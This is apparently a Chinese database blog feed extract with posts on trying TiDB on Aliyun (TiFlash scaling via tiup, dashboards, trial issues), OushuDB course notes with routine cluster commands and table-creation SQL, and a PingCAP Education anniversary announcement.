<p>简要总结，源码编译时，编译环境、依赖组件、所需版本都是要注意的。<br>
coding 还是要写注释的，至少日志输出不能少，不然遇到错误不好调查。<br>
尤其是数据库系统，万一遇到问题如何定位问题，如何快速且准确地解决，始终是 DBA 们的必修课。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/616771" >https://www.modb.pro/db/616771 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://pgfans.cn/a/2237" >https://pgfans.cn/a/2237 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://gitee.com/shawnyan/limonp/blob/master/CMakeLists.txt#L1" >https://gitee.com/shawnyan/limonp/blob/master/CMakeLists.txt#L1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>PostgreSQL</category>
        <category>PostgreSQL 15</category>
      </categories>
      <tags>
        <tag>postgresql</tag>
        <tag>postgresql 15</tag>
        <tag>pg_jieba</tag>
        <tag>extension</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB x Aliyun 免费试用，竟还有这般福利？</title>
    <url>/2023/tidb/tidb-aliyun-trial/</url>
    <content><![CDATA[<img  alt="tidb-aliyun-trial-banner.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/tidb-aliyun-trial-banner-1696311280028.jpg"
                      referrerpolicy="no-referrer"
                >
<p><strong>“在京海，路上遇到个 DBA 都知道 TiDB ！”</strong></p>
<blockquote>
<p>2022 年 6 月，PingCAP 与阿里云达成合作，融合双方技术优势的云数据库 TiDB 上线阿里云心选商城，为中国企业用户带来新一代 HTAP 数据库的云端体验。<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
</blockquote>
<p>近期 TiDB 的 AskTUG 社区发布了“云数据库TiDB”免费体验活动：<a class="link"   href="https://asktug.com/t/topic/1000432" >现在有一次获得价值 33000 元免费体验云数据库 TiDB 的机会！还有 Switch、AirPods 等你拿！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>有些同学还在讨论如何“白嫖” <a class="link"   href="https://cn.pingcap.com/education/" >TiDB 数据库的认证考试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，可是考试日程全年都有，然而试用活动可就只有一个月，参加试用活动岂不更香。且看这豪华配置，就比好多生产环境的数据库配置都要高好多。</p>
<ul>
<li>提供试用的产品规格：</li>
</ul>
<table>
<thead>
<tr>
<th>规格类型</th>
<th>TiDB</th>
<th>TiKV</th>
<th>TiFlash</th>
<th>总计节省费用</th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>4c8g</td>
<td>8c64g</td>
<td>8c64g</td>
<td>高达 ￥29,000</td>
</tr>
<tr>
<td>B</td>
<td>8c16g</td>
<td>8c64g</td>
<td>8c64g</td>
<td>高达 ￥33,000</td>
</tr>
</tbody>
</table>
<h2 id="创建-TiDB-集群">创建 TiDB 集群</h2>
<p>云数据库的优势很明显，可以选 “T-shirt”，直接选好规格，后台就自动创建、启动数据库集群，省去了大量前期的上架、布线、开网、部署工作和宝贵的时间。扩缩容也很便利，有对应的 UI 按钮。下图是我创建好集群后，在 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/dashboard-intro" >TiDB Dashboard <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 上看到的【实例】信息。具体步骤可参考文档： <a class="link"   href="https://aliyun-computenest.github.io/quickstart-tidb/" >帮助文档 &gt; 云数据库TiDB单可用区集群服务 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>集群刚创建时，是没有 TiFlash 实例的，需要在 【运维管理 &gt; 弹性扩缩容】进行扩容，可以选择需要扩容的节点数，完成后会自动加入当前 TiDB 集群。</p>
<img  alt="t01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/1-1677146592900.png"
                      referrerpolicy="no-referrer"
                >
<p>在 【资源】 中，找到【ControlServer】，点击【远程连接】，即可连接到 TiDB 云数据库的控制节点。</p>
<img  alt="t02.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/2-1677146604571.png"
                      referrerpolicy="no-referrer"
                >
<p>这里需要注意的是，首先要提权到【root】用户，才能试用【tiup】。</p>
<img  alt="t03.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/3-1677146617819.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="TiFlash-扩缩容">TiFlash 扩缩容</h2>
<h3 id="TiFlash-扩容">TiFlash 扩容</h3>
<p>TiFlash 扩容，上文已经提及，在界面上“下一步”就可以了，这里不再赘述。<br>
连接 TiDB 后，可以通过 Hint <code>/*+ read_from_storage(tiflash[table_name]) */</code> 强制查询通过 TiFlash 执行列存查询。</p>
<img  alt="t04.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/4-1677146628171.png"
                      referrerpolicy="no-referrer"
                >
<h4 id="TiFlash-引入新的存储格式-PageStorage-V3-–-Grafana-新增面板">TiFlash 引入新的存储格式 PageStorage V3 – Grafana 新增面板</h4>
<p>从 TiDB v6.2.0-DMR 版本起，TiFlash 引入 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tiflash-configuration#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-tiflashtoml" >新的存储格式 PageStorage V3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，提升稳定性和性能。</p>
<img  alt="t05.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/5-1677146641532.png"
                      referrerpolicy="no-referrer"
                >
<p>从上图中可以看出，当我将三张表增加 TiFlash 副本后，“节点”-OnlyV3 会伴随升到3。当然，Grafana 面板上展示的这些指标，也可直接通过 TiFlash 客户端查询。</p>
<img  alt="t06.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/6-1677148181966.png"
                      referrerpolicy="no-referrer"
                >
<p>其他面板指标，可查阅官档：<a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/grafana-performance-overview-dashboard#tiflash" >TiFlash 性能面板指标 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="TiFlash-缩容">TiFlash 缩容</h3>
<ol>
<li>TiDB 数据库组件的扩缩容是在同一画面（按组件数量扩缩容），也可指定具体缩容哪个节点，但目前，试用服务中的缩容功能会提示失败。如确需缩容，需要在阿里云上提工单。</li>
</ol>
<img  alt="t07.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/7-1677148202859.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="t08.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/8-1677148209546.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="t09.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/9-1677148213722.png"
                      referrerpolicy="no-referrer"
                >
<ol start="2">
<li>尝试使用 tiup 对 TiFlash 进行缩容。<br>
登录控制节点，使用 <code>tiup cluster scale-in &lt;tidb-cluster-name&gt; -N &lt;node&gt;</code> 命令进行缩容，按提示进行下一步，将指定的 TiFlash 节点置为“墓碑”（Tombstone）状态。再下一步，可以使用 <code>tiup cluster prune &lt;tidb-cluster-name&gt;</code> 命令对“墓碑”态的  TiFlash 进行销毁。切记，慎用此命令，该命令会删除对应节点上的所有组件和数据。<br>
此处，遇到了一个小问题，在进行销毁操作时，当前终端异常断开连接，需要从控制台重新创建连接，当然，重连后就可以看到 (<code>tiup cluster display</code>) 被销毁的 TiFlash 节点已经不存在了。</li>
</ol>
<img  alt="t10.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/10-1677148239399.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="t11.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/11-1677148245565.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="好用的-TiDB，好看的“热力图”">好用的 TiDB，好看的“热力图”</h2>
<p>TiDB Dashboard 中提供了流量可视化 (Key Visualizer) 页面，俗称热力图功能。该页面会以时间为横轴，Region 为纵轴，展示读写热点情况，具体的详细介绍和使用方法可参阅官档：<a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/dashboard-key-visualizer" >TiDB Dashboard 流量可视化页面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>下图是我做测试时的性能监控图和热力图，这里我只使用了两个 TiDB Server 中的一个节点，而非负载均衡 IP，所以 TiDB 使用情况中蓝线（实际使用的 TiDB Server 节点）较高，而绿线（另一个空闲节点）平稳。</p>
<img  alt="t12.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/12-1677148268642.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="t13.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/13-1677148274907.png"
                      referrerpolicy="no-referrer"
                >
<p>更多好看好玩的热力图看这里：<br>
<a class="link"   href="https://asktug.com/t/topic/813071" >【TiDBer 唠嗑茶话会 31】每个集群的热力图就是一副独一无二的”作品”，快来晒你的 TiDB 热力图吧！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="问题集锦">问题集锦</h2>
<p>新产品需要一个磨合期，这里记录几条我在试用期间遇到的小问题。</p>
<h3 id="阿里云相关">阿里云相关</h3>
<h4 id="1-可用区资源不足">1. 可用区资源不足</h4>
<p>创建 TiDB 数据库集群时，提示创建失败，勾选的可用区库存不足，换个可用区即可。</p>
<img  alt="t14.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/14-1677148331773.png"
                      referrerpolicy="no-referrer"
                >
<h4 id="2-创建订单失败">2. 创建订单失败</h4>
<img  alt="t15.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/15-1677148324799.png"
                      referrerpolicy="no-referrer"
                >
<h4 id="3-生成的【阿里云计算巢配置清单-云数据库-TiDB】里出现了-“undefined”，处理不够优雅">3. 生成的【阿里云计算巢配置清单-云数据库 TiDB】里出现了 “undefined”，处理不够优雅</h4>
<img  alt="t16.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/16-1677148318564.png"
                      referrerpolicy="no-referrer"
                >
<h4 id="4-阿里云面板向云服务器发送命令，下划线（-）未正常显示">4. 阿里云面板向云服务器发送命令，下划线（<code>_</code>）未正常显示</h4>
<img  alt="t17.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/17-1677148304571.png"
                      referrerpolicy="no-referrer"
                >
<h4 id="5-阿里云-workbench-无法正常显示统计信息">5. 阿里云 workbench 无法正常显示统计信息</h4>
<p>提供的四项统计信息：登录历史、计划任务、用户管理和服务管理，均无法显示数据。</p>
<img  alt="t18.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/18-1677148297362.png"
                      referrerpolicy="no-referrer"
                >
<p>此外，这个 workbench 工具的复制、粘贴特别不好用，每次复制出来的文本会自动加空行。<br>
我的小技巧是，可以使用快捷键 <code>Ctrl + Insert, Shift + Insert</code> 进行文本的复制、粘贴操作。</p>
<h3 id="TiDB-相关">TiDB 相关</h3>
<h4 id="1-Grafana-用户名提示不够友好">1. Grafana 用户名提示不够友好</h4>
<p>登录 TiDB Dashboard 时，用户名默认填写为 “root”，而登录 Grafana 时，没有默认提示，需要二次输入，而用户名又与前者不同，是为 “admin”，这也是交流群中被问及的高频问题之一。</p>
<table>
<thead>
<tr>
<th style="text-align:center">TiDB Dashboard</th>
<th style="text-align:center">Grafana</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><img  alt="t19.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/19-1677148349995.png"
                      referrerpolicy="no-referrer"
                ></td>
<td style="text-align:center"><img  alt="t20.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20-1677148354787.png"
                      referrerpolicy="no-referrer"
                ></td>
</tr>
</tbody>
</table>
<h4 id="2-Grafana-无法发送-Alerting">2. Grafana 无法发送 Alerting</h4>
<p>试用期间，尝试测试 飞书、Google Chat 发送告警，均未成功。<br>
另外，Google Hangouts Chat 产品已经下架，替代为 Google Chat，这里的名称显示建议修正一下。</p>
<img  alt="t21.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/21-1677148370034.png"
                      referrerpolicy="no-referrer"
                >
<h4 id="3-TiDB-Dashboard-链接指向内网-IP">3. TiDB Dashboard 链接指向内网 IP</h4>
<p>如图，面板提示有告警信息，但 URL 指向为内网 IP，无法查看，期待尽快修复。</p>
<img  alt="t22.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/22-1677148374802.png"
                      referrerpolicy="no-referrer"
                >
<h4 id="4-修改集群配置时，比对效果不够明晰">4. 修改集群配置时，比对效果不够明晰</h4>
<p>在使用 <code>tiup cluster edit</code> 命令时，有对比提示，如下图所示。个人感觉这里的展示效果如果采用 <code>git diff</code> 那种显示方式会更好。</p>
<img  alt="t23.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/23-1677148379218.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="总结">总结</h2>
<p>做个总结，最长可免费试用一个月的云数据库 TiDB，真香！🥳<br>
对于中小企业，业务连续性很高的业务，推荐考虑云数据库 TiDB 或者 <a class="link"   href="https://cn.pingcap.com/product/#SelectProduct" >TiDB Cloud <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，降本增效。<br>
如果是个人用户，初创企业或者是业务实时性不高的业务，可以考虑 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/dev-guide-build-cluster-in-cloud" >TiDB Cloud (Serverless Tier) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。<br>
TiDB x Aliyun 计算巢，是 PingCAP 和阿里云两家厂商共同努力的成果。PingCAP 具备丰富的 HTAP 数据库理论和高效能转化的生产力，可以快速迭代 TiDB （积极引入新特性，Bug 快速修复），拥有准实时反馈的 AskTUG 活跃社区，加之阿里云丰富的云平台优势与经验，定能“打好科技仪器设备、操作系统和基础软件国产化攻坚战”。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://cn.pingcap.com/events/tidb-on-aliyun/" >https://cn.pingcap.com/events/tidb-on-aliyun/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 6.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 6.x</tag>
        <tag>tiflash</tag>
        <tag>aliyun</tag>
        <tag>dashboard</tag>
      </tags>
  </entry>
  <entry>
    <title>OushuDB -- ODCP 课程学习笔记</title>
    <url>/2023/other/oushudb-odcp/</url>
    <content><![CDATA[<h2 id="OushuDB-简介">OushuDB 简介</h2>
<p>OushuDB 由国人自主研发，符合国家信创标准；通过计算存储分离架构解决了传统数据库高成本、高门槛、难维护、难扩展的问题。OushuDB 同时支持各大公有云和私有云。</p>
<p>Oushu Database（简称 OushuDB）是一款高性能云原生数据仓库，可以轻松用于构建核心数仓、数据集市、实时数仓、数据湖和湖仓一体数据平台。OushuDB 通过计算存储分离架构解决了传统 MPP 数据仓库和 Hadoop 高成本、高门槛、难维护、难拓展的问题。同时支持各大公有云和私有云。另外，OushuDB 由国人自主研发、符合信创标准，已在金融、电信、工业、能源、互联网等各个行业得到广泛的应用，偶数科技已经服务大型金融、电信、政府、能源等众多领域的全球客户，其中包括建设银行、中国移动、中国联通、国家电网、南方电网、海尔等诸多世界 500 强企业，以及 VMware 等海外软件巨头。</p>
<p>新一代云数据仓库，融合了 MPP 和 Hadoop 的两者的优点，并且解决了两者的缺点。在兼容性和性能等方面表现的很优秀。OushuDB 以偶数主导开源的Apache HAWQ 为基础，从设计之初就定位在新一代云数据仓库。OushuDB 的新一代 SIMD 执行器比传统 MPP 要快 5-10 倍，比一般的 SQL-on-Hadoop 要快 20 倍左右。OushuDB 支持 Update/Delete 和混合工作负载，实现了自己的存储，突破了 HDFS 的瓶颈。在可扩展性方面，因为采取了存储与计算分离的架构，可以扩展到上万节点，并且可以原生适应云计算的弹性需求。从而可以彻底满足 AI 和云时代的海量数据存储和分析的需求。</p>
<h2 id="OushuDB-和-Apache-HAWQ-的重要不同">OushuDB 和 Apache HAWQ 的重要不同</h2>
<ul>
<li>全新执行器，性能得到 5-10 倍提升，3.x 新特性</li>
<li>支持 Update/Delete</li>
<li>支持索引，加速点查询</li>
<li>支持分布式表存储 Magma，支持混合工作负载</li>
<li>支持对象存储，简化了公有云上的存储部署</li>
<li>支持虚拟计算集群，实现了虚拟计算集群之间的资源隔离</li>
<li>支持 ORC 外部存储格式，结合新的执行器，外部存储的性能可以提升10-50 倍</li>
<li>支持新一代可插拔存储框架，只需编写几个函数就可以添加一个外部数据源</li>
<li>支持 Master 节点 HA</li>
</ul>
<img  alt="oushu1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230106-0374b6e7-39ac-4ac2-a4da-9614b8617fab.PNG"
                      referrerpolicy="no-referrer"
                >
<h2 id="OushuDB-产品特色">OushuDB 产品特色</h2>
<ul>
<li>云原生：采用计算存储分离架构，利用云服务器、分布式存储，对数据基础设施的可扩展性进行深度优化，充分满足云端应用高度弹性、无限扩容的要求。支持腾讯云、阿里云、华为云、金山云、微软Azure、AWS等主流云平台。</li>
<li>高性能：面向PB级大数据的复杂查询，相比MPP和SQL-on-Hadoop快一个数量级。全新设计的执行器让性能提升5~10倍，显著降低批处理和即席查询所需的时间。</li>
<li>强兼容：具备完善的SQL标准和ACID特性，支持HDFS和多种对象存储的增删改查、以及偶数自研的Magma存储。兼容基于Oracle，PostgreSQL，Greenplum开发的数字应用，用户可以轻松实现不同数据基础设施的平稳迁移。</li>
<li>纯国产：OushuDB由国内顶尖数据库内核研发团队自主开发，符合国家信创标准。偶数研发团队曾主导国际顶级的数据库开源项目。</li>
<li>应用广：OushuDB已在金融、互联网、电信、政府、制造等行业的数百家头部企业得到广泛应用，助力各类企业完成数字化转型。</li>
</ul>
<h2 id="OushuDB-算存分离">OushuDB 算存分离</h2>
<p>OushuDB 是计算和存储分离的。它的数据是存储 Magma 或者是 HDFS 上。高性能，高可用的分布式存储系统，在主节点上需要配置 MagmaObserver 他用来提供整个集群的 Magma 可用节点，在各个从节点上会配置 MagmaNode。用来提供访问和存储 Magma 数据的服务，那数据还可以放在 HDFS 上。<br>
OushuDB 现在支持多种存储格式：AO、ORC 和 Magma。AO 是按行存储的格式，而 ORC、Magma 是按行列存储的格式。</p>
<img  alt="oushu2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230106-db9a6e5c-15ef-476f-aebf-5f0ea068b315.png"
                      referrerpolicy="no-referrer"
                >
<p>OushuDB通过可插拔存储原生支持HDFS，对象存储和自研分布式表存储Magma。三大存储可以通过多虚拟存储集群的机制原生的接入OushuDB，实现IO资源的物理隔离。</p>
<p>多虚拟存储集群技术(VSC)支持多路径，支持IO的负载均衡。来自于同一个VSC的用户表可以根据预定义的分布权重，负载均衡的打散到不同路径。创建表和使用表的过程对用户来说是完全透明的。</p>
<h2 id="常用命令">常用命令</h2>
<h3 id="启动-停止-OushuDB">启动/停止 OushuDB</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">source /usr/local/hawq/greenplum_path.sh # 设置OushuDB环境变量</span><br><span class="line">hawq start cluster # 启动整个OushuDB集群</span><br></pre></td></tr></table></figure></div>
<h3 id="启动-停止-Magma">启动/停止 Magma</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式一 OushuDB4.0 集群起停带Magma服务 [只有hawq init|start|stop cluster命令可以带--with_magma选项]</span></span><br><span class="line">hawq init cluster --with_magma # 启动OushuDB集群时，使用--with_magma选项，同时启动Magma服务, 3.X版本不支持。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式二 Magma服务单独起停</span></span><br><span class="line">magma start|stop|restart cluster</span><br><span class="line">magma start|stop|restart node</span><br></pre></td></tr></table></figure></div>
<h3 id="创建一个新的数据库-test，并在新的数据库中创建一个表-foo">创建一个新的数据库 test，并在新的数据库中创建一个表 foo</h3>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">psql <span class="operator">-</span>d postgres</span><br><span class="line"><span class="keyword">create</span> database test;  # 创建数据库test</span><br><span class="line">\c test  # 连接进入test数据库</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> foo(id <span class="type">int</span>, name <span class="type">varchar</span>);  # 创建表foo</span><br><span class="line">\d  # 显示当前数据库test中所有表</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> foo <span class="keyword">values</span>(<span class="number">1</span>, <span class="string">&#x27;hawq&#x27;</span>),(<span class="number">2</span>, <span class="string">&#x27;hdfs&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> foo; # 从表foo中选择数据</span><br><span class="line">explain analyze <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> foo;</span><br></pre></td></tr></table></figure></div>
<h3 id="创建schema">创建schema</h3>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> schema myschema;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> myschema.test(i <span class="type">int</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> myschema.test;</span><br><span class="line"><span class="keyword">show</span> search_path;</span><br></pre></td></tr></table></figure></div>
<h3 id="各种格式的表的建表语法">各种格式的表的建表语法</h3>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 默认创建的是AO表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> rank1 (id <span class="type">int</span>, rank <span class="type">int</span>, <span class="keyword">year</span> <span class="type">smallint</span>,gender <span class="type">char</span>(<span class="number">1</span>), count <span class="type">int</span> );</span><br><span class="line"></span><br><span class="line"># 和上面的创建的表一样，显式指定存储格式类型</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> rank2 (id <span class="type">int</span>, rank <span class="type">int</span>, <span class="keyword">year</span> <span class="type">smallint</span>,gender <span class="type">char</span>(<span class="number">1</span>), count <span class="type">int</span> ) <span class="keyword">with</span> (appendonly <span class="operator">=</span><span class="literal">true</span>, orientation <span class="operator">=</span><span class="type">row</span>);</span><br><span class="line"></span><br><span class="line"># 创建一个snappy压缩的AO表</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> rank3 (id <span class="type">int</span>, rank <span class="type">int</span>, <span class="keyword">year</span> <span class="type">smallint</span>,gender <span class="type">char</span>(<span class="number">1</span>), count <span class="type">int</span> ) <span class="keyword">with</span> (appendonly <span class="operator">=</span><span class="literal">true</span>, orientation <span class="operator">=</span><span class="type">row</span>, compresstype <span class="operator">=</span> snappy);</span><br><span class="line"></span><br><span class="line"># 创建一个snappy压缩的Parquet表，如果不指定压缩类型的话，默认不压缩。</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> rank3 (id <span class="type">int</span>, rank <span class="type">int</span>, <span class="keyword">year</span> <span class="type">smallint</span>,gender <span class="type">char</span>(<span class="number">1</span>), count <span class="type">int</span> ) <span class="keyword">with</span> (appendonly <span class="operator">=</span><span class="literal">true</span>, orientation <span class="operator">=</span>parquet, compresstype <span class="operator">=</span> snappy);</span><br><span class="line"></span><br><span class="line"># 创建一个不压缩的ORC表，如果不指定压缩类型的话，默认不压缩。</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> rank3 (id <span class="type">int</span>, rank <span class="type">int</span>, <span class="keyword">year</span> <span class="type">smallint</span>,gender <span class="type">char</span>(<span class="number">1</span>), count <span class="type">int</span> ) <span class="keyword">with</span> (appendonly <span class="operator">=</span><span class="literal">true</span>, orientation <span class="operator">=</span>orc);</span><br><span class="line"></span><br><span class="line"># 创建一个带压缩的ORC表，需指定压缩类型。</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> rank3 (id <span class="type">int</span>, rank <span class="type">int</span>, <span class="keyword">year</span> <span class="type">smallint</span>,gender <span class="type">char</span>(<span class="number">1</span>), count <span class="type">int</span> ) <span class="keyword">with</span> (appendonly <span class="operator">=</span><span class="literal">true</span>, orientation <span class="operator">=</span>orc, compresstype <span class="operator">=</span> lz4);</span><br><span class="line"></span><br><span class="line"># 创建一个压缩的magma表， magma 内部自动实现了压缩。</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> rank3 (id <span class="type">int</span>, rank <span class="type">int</span>, <span class="keyword">year</span> <span class="type">smallint</span>,gender <span class="type">char</span>(<span class="number">1</span>), count <span class="type">int</span> ) format <span class="string">&#x27;magmaap&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 创建一个有<span class="keyword">primary</span> key的magma表， magma 内部自动实现了压缩。</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> rank3 (id <span class="type">int</span>, rank <span class="type">int</span>, <span class="keyword">year</span> <span class="type">smallint</span>,gender <span class="type">char</span>(<span class="number">1</span>), count <span class="type">int</span>，<span class="keyword">primary</span> key(id) ) format <span class="string">&#x27;magmaap&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/604761" >https://www.modb.pro/db/604761 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>OushuDB</category>
      </categories>
      <tags>
        <tag>国产数据库认证</tag>
        <tag>oushudb</tag>
        <tag>odcp</tag>
        <tag>hawq</tag>
        <tag>magma</tag>
      </tags>
  </entry>
  <entry>
    <title>PingCAP Education 四周年！</title>
    <url>/2022/tidb/pingcap-education-4-years/</url>
    <content><![CDATA[<blockquote>
<p>节选自 PingCAP 公众号<br>
原文链接：<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzI3NDIxNTQyOQ==&amp;mid=2247507034&amp;idx=2&amp;sn=cca94657a0644df5f565d47a5ebd25d2" >PingCAP Education 四周年，100 个 PCTA 认证考试兑换码限量赠送，先到先得！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>PingCAP Education 四周年来了，我们准备了 100 个 PCTA 认证名额限时发放！想学习 TiDB，了解最前沿的数据库技术？想获得认证，为你的职业技能添砖加瓦？快加入我们吧！先到先得，不要错过！</p>
<blockquote>
<p>PCTA （PingCAP Certified TiDB Associate）是 PingCAP 认证 TiDB 数据库专员的简称，面向正在或即将在工作中使用 TiDB 数据库的开发人员、DBA 和架构师，是 PingCAP<br>
对于数据库从业者安装部署及日常运维分布式关系型数据库能力的认证，要求数据库从业者熟练掌握 TiDB 架构原理、安装部署、周边工具等基础知识。</p>
</blockquote>
<p>2018 年 10 月 30 日，TiDB 培训认证项目正式发起，不知不觉间，PingCAP Education 已经陪伴了大家 4 个年头，四年的时间里，无数 TiDBer 因 TiDB 课程和认证与 TiDB 结缘，在学习过程中得到历练，加入到 TiDB 人才阵营。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/tidb/pingcap-education-4-years/pe-1.png"
                      alt="" loading="lazy"
                ><br>
<img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/tidb/pingcap-education-4-years/pe-2.png"
                      alt="" loading="lazy"
                ></p>
<p>部分认证学员 ID 随机生成的云图</p>
